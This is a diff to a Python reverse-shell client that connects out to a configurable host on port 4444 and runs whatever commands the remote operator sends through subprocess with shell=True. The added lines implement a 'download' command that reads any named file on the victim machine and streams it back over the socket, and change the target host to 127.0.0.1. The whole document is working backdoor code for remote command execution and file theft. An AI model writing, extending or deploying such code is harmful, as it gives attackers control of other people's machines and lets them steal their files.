@@ -1,9 +1,11 @@
 import socket
 import subprocess
 import os
+from time import sleep
+
 
 COUNT = 0
-RHOST = "192.168.0.16"  # change me
+RHOST = "127.0.0.1"  # change me
 RPORT = 4444  # change me if you want or need
 
 while True:
@@ -31,6 +33,18 @@ while True:
             elif cmd == 'exit\n':
                 COUNT += 1
 
+            # downloading a file
+            elif cmd.split(" ")[0] == 'download':
+                with open(cmd.split(" ")[1].replace("\n", ""), "rb") as f:
+                    file_data = f.read(1024)
+                    while file_data:
+                        tcp.send(b"Downloading a file\n")
+                        tcp.send(file_data)
+                        file_data = f.read(1024)
+
+                    sleep(2)
+                    tcp.send(b'Done')
+            # run all commands
             else:
                 output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           stdin=subprocess.PIPE)
